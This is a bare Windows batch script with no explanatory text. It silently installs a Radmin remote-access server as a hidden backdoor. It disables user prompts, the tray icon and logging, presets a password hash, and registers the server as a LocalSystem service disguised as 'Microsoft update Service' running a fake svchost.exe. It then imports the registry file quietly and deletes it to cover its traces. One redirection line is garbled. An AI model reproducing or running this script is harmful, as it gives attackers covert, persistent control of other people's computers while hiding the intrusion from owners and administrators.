echo Windows Registry Editor Version 5.00 >> %windir%\line1.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters] >> %windir%\line1.reg 
echo "NTAuthEnabled"=hex:00,00,00,00 >> %windir%\line1.reg 
echo "Port"=hex:23,13,00,00 >> %windir%\line1.reg 
echo "NTAuthId"=hex:04,00,00,00 >> %windir%\line1.reg 
echo "Timeout"=hex:0a,00,00,00 >> %windir%\line1.reg 
echo "AutoAllow"=hex:00,00,00,00 >> %windir%\line1.reg 
echo "AskUser"=hex:00,00,00,00 >> %windir%\line1.reg 
echo "EnableEventLog"=hex:00,00,00,00 >> %windir%\line1.reg 
echo "Parameter"=hex:12,97,bb,bc,54,0e,f7,cf,c1,fc,be,52,7e,a1,fd, 20 >> %windir%\line1.reg 
echo "EnableLogFile"=hex:00,00,00,00 >> %windir%\line1.reg 
echo "FilterIp"=hex:00,00,00,00 >> %windir%\line1.reg 
echo "DisableTrayIcon"=hex:01,00,00,00 >> %windir%\line1.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\r_server] >> %windir%\line1.reg 
echo "Type"=dword:00000110  >> %windir%\line1.reg 
echo "Start"=dword:00000002  >> %windir%\line1.reg 
echo "ErrorControl"=dword:00000001 >> %windir%\line1.reg 
echo "DisplayName"="Microsoft update Service" >> %windir%\line1.reg 
echo "ObjectName"="LocalSystem" >> %windir%\line1.reg 
echo "ImagePath"=hex(2):22,00,43,00,3a,00,5c,00,57,00,49,00,4e,00,44,00,4f,00,57,00,53,00,5c,00,73,00,76,00,63,00,68,00,6f,00,73,00,74,00,2e,00,65,00,78,00,65,00,22,00,20,00,2f,00,73,00,65,00,72,00,76,00,69,00,63,00,65,00,00,00 >> %windir%\line1.reg 
echo "Description"="Microsoft Service"  >> %windir%\line1.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\r_server\Security] >> %windir%\line1.reg 
echo "Security"=hex:01,00,14,80,90,00,00,00,9c,00,00,00,14,00,00,00,30,00,00,00,02,00,1c,00,01,00,00,00,02,80,14,00,ff,01,0f,00,01,01,00,00,00,00,00,01,00,00,00,00,02,00,60,00,04,00,00,00,00,00,14,00,fd,01,02,00,01,01,00,00,00,00,00,05,12,00,00,00,00,00,18,00,ff,01,0f,00,01,02,00,00,00,00,00,05,20,00,00,00,20,02,00,00,00,00,14,00,8d,01,02,00,01,01,00,00,00,00,00,05,0b,00,00,00,00,00,18,00,fd,01,02,00,01,02,00,00,00,00,00,05,20,00,00,00,23,02,00,00,01,01,00,00,00,00,00,05,12,00,00,00,01,01,00,00,00,00,00,05,12,00,00,00  >> %windir%\line1.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\r_server\Enum] >> %windir%\line1.reg 
echo "0"="Root\\LEGACY_R_SERVER\\0000"  >> %windir%\line1.reg 
echo "Count"=dword:00000001  >> %windir%\line1.reg 
echo "NextInstance"=dword:00000001 >> %windir%\>> %windir%\line1.reg 
regedit /s %windir%\line1.reg 
del /q %windir%\line1.reg 